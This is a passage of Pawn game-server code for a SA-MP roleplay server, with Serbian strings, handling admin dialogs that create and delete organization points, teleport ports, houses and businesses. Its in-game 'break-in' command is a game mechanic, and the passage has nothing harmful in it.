		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );
		if( OI[ id ][ oTip ] != ORG_TIP_PD ) return SendErrorMessage( playerid, "Samo organizacije tipa PD/SWAT/FBI." );
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		OI[ id ][ oDutyPoint ][ 0 ] = Pos[ 0 ];
		OI[ id ][ oDutyPoint ][ 1 ] = Pos[ 1 ];
		OI[ id ][ oDutyPoint ][ 2 ] = Pos[ 2 ];
		OI[ id ][ oDutyInt ] = GetPlayerInterior( playerid );
        OI[ id ][ oDutyVW ] = GetPlayerVirtualWorld( playerid );

		if( IsValidDynamic3DTextLabel( OrgDuty3D[ id ] ) )
		    DestroyDynamic3DTextLabel( OrgDuty3D[ id ] );

		if( IsValidDynamicPickup( DutyPointPickup[ id ] ) )
			DestroyDynamicPickup( DutyPointPickup[ id ] );

		OrgDuty3D[ id ] = CreateDynamic3DTextLabel( ""col_white"[ /undercover ]\n"col_crvena"[ /duty ]", -1, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oDutyVW ], OI[ id ][ oDutyInt ], -1, 20.0);
		DutyPointPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ], OI[ id ][ oDutyVW ], OI[ id ][ oDutyInt ], -1, 20.0 );

		SaveOrganization( id );
		SendInfoMessage( playerid, "Kreirali ste duty point za organizaciju (ID: %d )!", id );
	}
	else if( dialogid == dialog_ORGEQUIPP && response ) {
        new id, ImaFajl[ 40 ], Float:Pos[ 3 ];
		if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_ORGEQUIPP, DSI, D_NASLOV, "Unesti ID organizacije za koju pravite equipment point.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), O_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );
		if( OI[ id ][ oTip ] != ORG_TIP_PD ) return SendErrorMessage( playerid, "Samo organizacije tipa PD/SWAT/FBI." );
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		OI[ id ][ oEquipPoint ][ 0 ] = Pos[ 0 ];
		OI[ id ][ oEquipPoint ][ 1 ] = Pos[ 1 ];
		OI[ id ][ oEquipPoint ][ 2 ] = Pos[ 2 ];
		OI[ id ][ oEquipInt ] = GetPlayerInterior( playerid );
        OI[ id ][ oEquipVW ] = GetPlayerVirtualWorld( playerid );

		if( IsValidDynamic3DTextLabel( OrgEquip3D[ id ] ) )
		    DestroyDynamic3DTextLabel( OrgEquip3D[ id ] );

		if( IsValidDynamicPickup( EquipPointPickup[ id ] ) )
			DestroyDynamicPickup( EquipPointPickup[ id ] );

		OrgEquip3D[ id ] = CreateDynamic3DTextLabel( ""col_white"Da otvorite meni armorija kucajte\n"col_crvena"[ /pdoprema ]", -1, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oEquipVW ], OI[ id ][ oEquipInt ], -1, 20.0);
		EquipPointPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ], OI[ id ][ oEquipVW ], OI[ id ][ oEquipInt ], -1, 20.0 );

		SaveOrganization( id );
		SendInfoMessage( playerid, "Kreirali ste equipment point za organizaciju (ID: %d )!", id );
	}
    else if(dialogid == dialog_SLABATACKA && response) {

        new id, ImaFajl[ 40 ], Float:Pos[ 3 ];
        if(sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_SLABATACKA, DSI, D_NASLOV, "Unesti ID organizacije za koju pravite slabu tacku.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), O_FILE, id );
        if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );
        GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

        OI[ id ][ oSlabaTacka ][ 0 ] = Pos[ 0 ];
        OI[ id ][ oSlabaTacka ][ 1 ] = Pos[ 1 ];
        OI[ id ][ oSlabaTacka ][ 2 ] = Pos[ 2 ];
        OI[ id ][ oSlabaTackaProbijena ] = false;

        if( IsValidDynamic3DTextLabel( slabaTackaLabel[ id ] ) )
            DestroyDynamic3DTextLabel( slabaTackaLabel[ id ] );

        if( IsValidDynamicPickup( slabaTackaPickup[ id ] ) )
            DestroyDynamicPickup( slabaTackaPickup[ id ] );

        slabaTackaLabel[id] = CreateDynamic3DTextLabel( ""col_white"Da provalite u organizaciju kucajte\n"col_crvena"[ /probijslabutacku ]", -1, OI[ id ][ oSlabaTacka ][ 0 ], OI[ id ][ oSlabaTacka ][ 1 ], OI[ id ][ oSlabaTacka ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0);
        slabaTackaPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oSlabaTacka ][ 0 ], OI[ id ][ oSlabaTacka ][ 1 ], OI[ id ][ oSlabaTacka ][ 2 ], -1, -1, -1, 20.0 );

        SaveOrganization( id );
        SendInfoMessage( playerid, "Kreirali ste slabu tacku za organizaciju (ID: %d )!", id );
    }
	else if( dialogid == dialog_ORGPORTP && response ) {
        new id, string[ 15 ], ImaFajl[ 40 ], Float:Pos[ 3 ], int1, vw1, Float:x, Float:y, Float:z;
		if( sscanf( inputtext, "ifffii", id, x, y, z, int1, vw1 ) ) return SPD( playerid, dialog_ORGPORTP, DSI, D_NASLOV, "Unesti ID orge, pozicije, int i virtual world gde ce se portati as ovog mesta\n\nPrimer: 12 2323.123 756.341 12.24 2 3.", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), O_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );
		if( OI[ id ][ oMaxPort ] == 10 ) return SendErrorMessage( playerid, "Ta organizacija vec ima 10 portova." );

		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 0 ] = Pos[ 0 ];
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 1 ] = Pos[ 1 ];
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 2 ] = Pos[ 2 ];
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Int ][ 0 ] = GetPlayerInterior( playerid );
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ VW ][ 0 ] = GetPlayerVirtualWorld( playerid );

		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 0 ] = x;
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 1 ] = y;
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 2 ] = z;
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Int ][ 1 ] = int1;
		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ VW ][ 1 ] = vw1;

		PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pickup ][ 0 ] = CreateDynamicPickup( 1239, 1, PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 0 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 1 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 2 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ VW ][ 0 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Int ][ 0 ], -1, 20.0 );
        PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pickup ][ 1 ] = CreateDynamicPickup( 1239, 1, PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 0 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 1 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 2 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ VW ][ 1 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Int ][ 1 ], -1, 20.0 );

        new stringgg[128];
        format(stringgg, sizeof(stringgg), ""col_white"Port Point\nOrganizacija : "col_crvena"%s", getOrgName(id));
        PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Label ][ 0 ] = CreateDynamic3DTextLabel(stringgg, -1, PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 0 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 1 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos1 ][ 2 ], 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, PortOP[ id ][ OI[ id ][ oMaxPort ] ][ VW ][ 0 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Int ][ 0 ], -1, 20.0, -1, 0);
        PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Label ][ 1 ] = CreateDynamic3DTextLabel(stringgg, -1, PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 0 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 1 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Pos2 ][ 2 ], 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, PortOP[ id ][ OI[ id ][ oMaxPort ] ][ VW ][ 1 ], PortOP[ id ][ OI[ id ][ oMaxPort ] ][ Int ][ 1 ], -1, 20.0, -1, 0);

		new pFile[ 40 ];
        format( pFile, sizeof( pFile ), PORT_FILE, id );
        new INI:File = INI_Open( pFile );

		format( string, sizeof( string ), "Pos1X%d", OI[ id ][ oMaxPort ] );
		INI_WriteFloat( File, string, Pos[ 0 ] );

		format( string, sizeof( string ), "Pos1Y%d", OI[ id ][ oMaxPort ] );
		INI_WriteFloat( File, string, Pos[ 1 ] );

		format( string, sizeof( string ), "Pos1Z%d", OI[ id ][ oMaxPort ] );
		INI_WriteFloat( File, string, Pos[ 2 ] );

		format( string, sizeof( string ), "Int1%d", OI[ id ][ oMaxPort ] );
		INI_WriteInt( File, string, GetPlayerInterior( playerid ) );

		format( string, sizeof( string ), "VW1%d", OI[ id ][ oMaxPort ] );
		INI_WriteInt( File, string, GetPlayerVirtualWorld( playerid ) );

        format( string, sizeof( string ), "Pos2X%d", OI[ id ][ oMaxPort ] );
		INI_WriteFloat( File, string, x );

		format( string, sizeof( string ), "Pos2Y%d", OI[ id ][ oMaxPort ] );
		INI_WriteFloat( File, string, y );

		format( string, sizeof( string ), "Pos2Z%d", OI[ id ][ oMaxPort ] );
		INI_WriteFloat( File, string, z );

		format( string, sizeof( string ), "Int2%d", OI[ id ][ oMaxPort ] );
		INI_WriteInt( File, string, int1 );

		format( string, sizeof( string ), "VW2%d", OI[ id ][ oMaxPort ] );
		INI_WriteInt( File, string, vw1 );

		INI_Close( File );

        OI[ id ][ oMaxPort ]++;
        SaveOrganization( id );
	}
	else if( dialogid == dialog_ORGDELETE && response ) {
	    new id, ImaFajl[40];
	    if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "Unesi samo ID orge!" );
	    if( sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_ORGDELETE, DSI, D_NASLOV, "Unesite id organizacije koju zelite obrisati!", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), O_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta organizacija ne postoji." );

		Delete3DTextLabel( Org3D[ id ] );

    	if( IsValidDynamicPickup( OrgPickup[ id ] ) )
			DestroyDynamicPickup( OrgPickup[ id ] );
    	
    	if( IsValidDynamic3DTextLabel( OrgSafe3d[ id ] ) )
			DestroyDynamic3DTextLabel( OrgSafe3d[ id ] );

		if( IsValidDynamicPickup( OrgSafePickup[ id ] ) )
			DestroyDynamicPickup( OrgSafePickup[ id ] );
			
		if( IsValidDynamic3DTextLabel( OrgField3d[ id ] ) )
			DestroyDynamic3DTextLabel( OrgField3d[ id ] );

		if( IsValidDynamicPickup( OrgFieldPickup[ id ] ) )
			DestroyDynamicPickup( OrgFieldPickup[ id ] );
			
        if( IsValidDynamic3DTextLabel( OrgEquip3D[ id ] ) )
		    DestroyDynamic3DTextLabel( OrgEquip3D[ id ] );

		if( IsValidDynamicPickup( EquipPointPickup[ id ] ) )
			DestroyDynamicPickup( EquipPointPickup[ id ] );

        if(IsValidDynamicPickup(slabaTackaPickup[id]))
            DestroyDynamicPickup(slabaTackaPickup[id]);

        if(IsValidDynamic3DTextLabel(slabaTackaLabel[id]))
            DestroyDynamic3DTextLabel(slabaTackaLabel[id]);
			
        if( IsValidDynamic3DTextLabel( OrgDuty3D[ id ] ) )
		    DestroyDynamic3DTextLabel( OrgDuty3D[ id ] );

		if( IsValidDynamicPickup( DutyPointPickup[ id ] ) )
			DestroyDynamicPickup( DutyPointPickup[ id ] );
			
		OI[ id ][ oPozExtX ] = 0;
		OI[ id ][ oPozExtY ] = 0;
		OI[ id ][ oPozExtZ ] = 0;
			
    	fremove( ImaFajl );
    	SendInfoMessage( playerid, "Uspesno ste izbrisali organizaciju id %d", id );
	}
	else if( dialogid == dialog_FDELETE && response ) {
	    new id, ImaFajl[40];
	    if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "Unesi samo ID firme!" );
	    if( sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_FDELETE, DSI, D_NASLOV, "Unesite id firme koju zelite obrisati!", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), F_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta firma ne postoji." );

        if( IsValidDynamicPickup( FirmaPickup[ id ] ) )
			DestroyDynamicPickup( FirmaPickup[ id ] );

		if( IsValidDynamic3DTextLabel( FirmaLabel[ id ] ) )
			DestroyDynamic3DTextLabel( FirmaLabel[ id ] );

		format( globalstring, sizeof( globalstring ), F_FILE, id );
    	fremove( globalstring );

    	SendInfoMessage( playerid, "Uspesno ste izbrisali firmu id %d", id );
	}
	else if( dialogid == dialog_IMDELETE && response ) {
	    new id, ImaFajl[ 40 ];
	    if( !IsNumeric( inputtext ) ) return SendErrorMessage( playerid, "Unesi samo ID imovine!" );
	    if( sscanf( inputtext, "i", id ) ) return SPD( playerid, dialog_IMDELETE, DSI, D_NASLOV, "Unesite id imovine koju zelite obrisati!", D_ODABERI, D_ODUSTANI );
        format( ImaFajl, sizeof( ImaFajl ), IM_FILE, id );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ta imovina ne postoji." );

		II[ id ][ iExit ][ 0 ] = 0.0;
  		II[ id ][ iExit ][ 1 ] = 0.0;
  		II[ id ][ iExit ][ 2 ] = 0.0;
		II[ id ][ iEnter ][ 0 ] = 0.0;
		II[ id ][ iEnter ][ 1 ] = 0.0;
	   	II[ id ][ iEnter ][ 2 ] = 0.0;

		if( IsValidDynamicPickup( ImovinaPickup[ id ] ) )
			DestroyDynamicPickup( ImovinaPickup[ id ] );

		if( IsValidDynamic3DTextLabel( ImovinaLabel[ id ] ) )
			DestroyDynamic3DTextLabel( ImovinaLabel[ id ] );

    	format( globalstring, sizeof( globalstring ), IM_FILE, id );
    	fremove( globalstring );
    	SendInfoMessage( playerid, "Uspesno ste izbrisali imovinu id %d", id );
	}
	else if( dialogid == dialog_IMCREATE ) {
	    if( response ) {
			new im = SledeciIDImovine( MAX_IMOVINA ), vrsta, Float:PozX, Float:PozY, Float:PozZ, string[ 256 ], iimovine[ 40 ];
	        if( sscanf( inputtext, "i", vrsta ) ) return SPD( playerid, dialog_IMCREATE, DSI, D_NASLOV, "Unesite vrstu kuce koju zelite.\nVrste: 1. Mala kuca 2. Srednja Kuca 3. Velika kuca 4. PentHouse!", D_ODABERI, D_NAZAD );
			if( vrsta < 1 || vrsta > 4 ) return SendErrorMessage( playerid, "Pogresna vrsta!" );
			GetPlayerPos( playerid, PozX, PozY, PozZ );
		    format( iimovine, sizeof( iimovine ), IM_FILE, im );
			if( fexist( iimovine ) ) return SendErrorMessage( playerid, "ID te imovine vec postoji!" );
   			if( vrsta == MALA_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = MALA_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = MALA_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = MALA_KUCA_Z;
			    II[ im ][ iPrice ] = MALA_KUCA_PRICE;
			    II[ im ][ iInterior ] = MALA_KUCA_INT;
			    II[ im ][ iVrsta ] = MALA_KUCA;
			}
			else if( vrsta == SREDNJA_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = SREDNJA_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = SREDNJA_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = SREDNJA_KUCA_Z;
			    II[ im ][ iPrice ] = SREDNJA_KUCA_PRICE;
			    II[ im ][ iInterior ] = SREDNJA_KUCA_INT;
			    II[ im ][ iVrsta ] = SREDNJA_KUCA;
			}
			else if( vrsta == VELIKA_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = VELIKA_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = VELIKA_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = VELIKA_KUCA_Z;
			    II[ im ][ iPrice ] = VELIKA_KUCA_PRICE;
			    II[ im ][ iInterior ] = VELIKA_KUCA_INT;
			    II[ im ][ iVrsta ] = VELIKA_KUCA;
			}
			else if( vrsta == PENTHOUSE_KUCA ) {
			    II[ im ][ iUsage ] = IMOVINA_KUCA;
			    II[ im ][ iExit ][ 0 ] = PENTHOUSE_KUCA_X;
	    		II[ im ][ iExit ][ 1 ] = PENTHOUSE_KUCA_Y;
	    		II[ im ][ iExit ][ 2 ] = PENTHOUSE_KUCA_Z;
			    II[ im ][ iPrice ] = PENTHOUSE_KUCA_PRICE;
			    II[ im ][ iInterior ] = PENTHOUSE_KUCA_INT;
			    II[ im ][ iVrsta ] = PENTHOUSE_KUCA;
			}
			II[ im ][ iOwned ] = 0;
   			II[ im ][ iNeaktivnost ] = 0;
			strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
			II[ im ][ iEnter ][ 0 ] = PozX;
			II[ im ][ iEnter ][ 1 ] = PozY;
		   	II[ im ][ iEnter ][ 2 ] = PozZ;
		    II[ im ][ iLocked ] = 0;
		    II[ im ][ iVW ] = im;
		    II[ im ][ iOrmar ] = 0;
		    II[ im ][ iLevel ] = 5;
		    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
			II[ im ][ iSkin ][ 0 ] = 0;
			II[ im ][ iSkin ][ 1 ] = 0;
			II[ im ][ iSkin ][ 2 ] = 0;
			II[ im ][ iSafeStatus ] = 0; II[ im ][ iSafePass ] = 0;
			II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
			II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
			II[ im ][ iDrug ][ 0 ] = 0; II[ im ][ iDrug ][ 1 ] = 0; II[ im ][ iDrug ][ 2 ] = 0; II[ im ][ iDrug ][ 3 ] = 0; II[ im ][ iDrug ][ 4 ] = 0;
			II[ im ][ iDrug ][ 5 ] = 0; II[ im ][ iDrug ][ 6 ] = 0; II[ im ][ iDrug ][ 7 ] = 0; II[ im ][ iDrug ][ 8 ] = 0; II[ im ][ iDrug ][ 9 ] = 0;
			II[ im ][ iDrugCode ][ 0 ] = 0; II[ im ][ iDrugCode ][ 1 ] = 0; II[ im ][ iDrugCode ][ 2 ] = 0; II[ im ][ iDrugCode ][ 3 ] = 0; II[ im ][ iDrugCode ][ 4 ] = 0;
			II[ im ][ iDrugCode ][ 5 ] = 0; II[ im ][ iDrugCode ][ 6 ] = 0; II[ im ][ iDrugCode ][ 7 ] = 0; II[ im ][ iDrugCode ][ 8 ] = 0; II[ im ][ iDrugCode ][ 9 ] = 0;
	        II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0; II[ im ][ iPizzaTime ] = 0;
			SaveProperty( im );
		    format( string, sizeof( string ),"{F53D00}Kuca na Prodaju"col_white"[ID %d]{F53D00}\nVrsta: "col_white"%s{F53D00}\nCena: "col_white"%d$\n{F53D00}Potreban level: "col_white"%d\n{F53D00}Adresa: "col_white"%s\n{F53D00}Za kupovinu "col_white"/kupiimovinu", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
		    ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
		    ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			SendInfoMessage( playerid, "Uspesno si kreirao kucu." );
		}
	}
    else if( dialogid == dialog_FirmaSetJob) {

        if(!response) return 0;
        if(response) {

            new jobID;

            if(sscanf(inputtext, "d", jobID)) return ShowPlayerDialog(playerid, dialog_FirmaSetJob, DIALOG_STYLE_INPUT, "Kreiranje Firme", "Unesite ID posla za vasu firmu", "Potvrdi", "");

            if(jobID < 1 || jobID > MAX_JOBS) return ShowPlayerDialog(playerid, dialog_FirmaSetJob, DIALOG_STYLE_INPUT, "Kreiranje Firme", "Pogresan ID Posla\nUnesite ID posla za vasu firmu", "Potvrdi", "");

            new IDFirme = SledeciIDFirme( MAX_BUSSINES ), Float:PozX, Float:PozY, Float:PozZ, f_string[ 300 ];
            GetPlayerPos( playerid, PozX, PozY, PozZ );

            BussinesInfo[ IDFirme ][ bOwned ] = 0;
            BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
            BussinesInfo[ IDFirme ][ bEnterX ] = PozX;
            BussinesInfo[ IDFirme ][ bEnterY ] = PozY;
            BussinesInfo[ IDFirme ][ bEnterZ ] = PozZ;
            BussinesInfo[ IDFirme ][ bLocked ] = 0;
            BussinesInfo[ IDFirme ][ bLevel ] = 10;
            BussinesInfo[ IDFirme ][ bJobID ] = jobID;

            BussinesInfo[ IDFirme ][ bPrice ] = 99999999;
            new firmaIme[32];
            format(firmaIme, 32, "%s", getJobName(jobID));
            strmid( BussinesInfo[ IDFirme ][ bName ], firmaIme, 0, strlen( firmaIme ), 64);
            BussinesInfo[ IDFirme ][ bType ] = VRSTA_POSAO;
            BussinesInfo[ IDFirme ][ bInVW ] = IDFirme;

            BussinesInfo[ IDFirme ][ bMoney ] = 0;
            BussinesInfo[ IDFirme ][ bInt ] = GetPlayerInterior( playerid );
            BussinesInfo[ IDFirme ][ bProducts ] = 100;
            BussinesInfo[ IDFirme ][ bNProducts ] = 0;
            BussinesInfo[ IDFirme ][ bPriceProdukta ] = 0;
            BussinesInfo[ IDFirme ][ bVW ] = GetPlayerVirtualWorld( playerid );
            strmid( BussinesInfo[ IDFirme ][ bOwner], "Drzava", 0, strlen( "Drzava" ), 32);
            SaveBussines( IDFirme );

            format( f_string, sizeof( f_string), "{00DCF5}Poslovna Firma na prodaju"col_white"[ID %d]{00DCF5}\nPosao : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Za kupovinu upisite\n/kupifirmu", IDFirme, firmaIme, BussinesInfo[ IDFirme ][ bPrice ], getBussinesType( IDFirme ), BussinesInfo[ IDFirme ][ bLevel ]);
            FirmaLabel[ IDFirme ] = CreateDynamic3DTextLabel( f_string, 0x33CCFFAA, PozX, PozY, PozZ, 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
            FirmaPickup[ IDFirme ] = CreateDynamicPickup( 1210, 1, PozX, PozY, PozZ ); Bussines_Refresh( IDFirme );
            
            SendInfoMessage( playerid, "Uspesno si kreirao firmu." );

            return 1;
        }
    }
	else if( dialogid == dialog_FCREATE ) {
	    if( response ) {
		    new IDFirme = SledeciIDFirme( MAX_BUSSINES ), vrsta, Float:PozX, Float:PozY, Float:PozZ, f_string[ 300 ], ffirme[ 40 ];
			GetPlayerPos( playerid, PozX, PozY, PozZ );
			if(sscanf( inputtext, "i", vrsta ) ) return SPD( playerid, dialog_FCREATE, DSI, D_NASLOV, "Unesite vrstu firme koju zelite.\nVrste: 0. 24/7 1. Burg 2. Cluckin Bell 3. Binco 4. Firma bez ulaza 5. Zip 6. Victim 7. Suburban\n8. Bar 9. Gym 10. Gun Shop 11. MRestoran 12. VRestoran 13. Pizza 14. Nocni klub\n 15. Disco 16. Electronic Shop 17. Trafika 18.Firma za posao 19. Rent firma 20. Pumpa 21. Javna Kuca 22. Kladionica\n23. Prazan Lokal 24. Casino", D_ODABERI, D_NAZAD );
	        format( ffirme, sizeof( ffirme ), F_FILE, IDFirme );
			if( fexist( ffirme ) ) return SendErrorMessage( playerid, "ID te firme vec postoji!" );
			if( vrsta < 0 || vrsta > 24 ) return SendErrorMessage( playerid, "Pogresna vrsta!" );
            if(vrsta == 18) {

                ShowPlayerDialog(playerid, dialog_FirmaSetJob, DIALOG_STYLE_INPUT, "Kreiranje Firme", "Unesite ID posla za vasu firmu", "Potvrdi", "");

                return 1;
            }
            if(vrsta == 19) return SendErrorMessage(playerid, "Opcija iskljucena!");
            if(vrsta == 16) return SendErrorMessage(playerid, "Opcija iskljucena!");

            BussinesInfo[ IDFirme ][ bOwned ] = 0;
            BussinesInfo[ IDFirme ][ bNeaktivnost ] = 0;
		    BussinesInfo[ IDFirme ][ bEnterX ] = PozX;
		    BussinesInfo[ IDFirme ][ bEnterY ] = PozY;
	   		BussinesInfo[ IDFirme ][ bEnterZ ] = PozZ;
		    BussinesInfo[ IDFirme ][ bLocked ] = 0;
		    BussinesInfo[ IDFirme ][ bLevel ] = 5;
		    BussinesInfo[ IDFirme ][ bJobID ] = 0; //Cene firmi
			if( vrsta == 0 ) { // 24/7 Market
				BussinesInfo[ IDFirme ][ bInInt ] = 18;
	    		BussinesInfo[ IDFirme ][ bExitX ] = -30.9076;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -92.0104;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1003.5469;
			    BussinesInfo[ IDFirme ][ bPrice ] = 500000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Prodavnica 24/7", 0, strlen( "Prodavnica 24/7" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_MARKET;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
			else if( vrsta == 1 ) { // Burg
				BussinesInfo[ IDFirme ][ bInInt ] = 10;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 363.1478;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -75.1698;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1001.507812;
			    BussinesInfo[ IDFirme ][ bPrice ] = 350000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Burg", 0, strlen( "Burg" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_BURG;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 2 ) { // Clucking Bell
				BussinesInfo[ IDFirme ][ bInInt ] = 9;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 365.0046;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -11.8387;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1001.8516;
			    BussinesInfo[ IDFirme ][ bPrice ] = 350000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Cluckin Bell", 0, strlen( "Cluckin Bell" ), 64);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_CLUCK;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
	        else if( vrsta == 3 ) { // Binco
				BussinesInfo[ IDFirme ][ bInInt ] = 15;
	    		BussinesInfo[ IDFirme ][ bExitX ] = 207.7204;
	    		BussinesInfo[ IDFirme ][ bExitY ] = -110.5464;
	    		BussinesInfo[ IDFirme ][ bExitZ ] = 1005.132812;
			    BussinesInfo[ IDFirme ][ bPrice ] = 450000;
				strmid( BussinesInfo[ IDFirme ][ bName ], "Binco", 0, strlen( "Binco" ), 128);
			    BussinesInfo[ IDFirme ][ bType ] = VRSTA_BINCO;
			    BussinesInfo[ IDFirme ][ bInVW ] = IDFirme; }
			else if( vrsta == 4 ) { // Bez ulaza firme
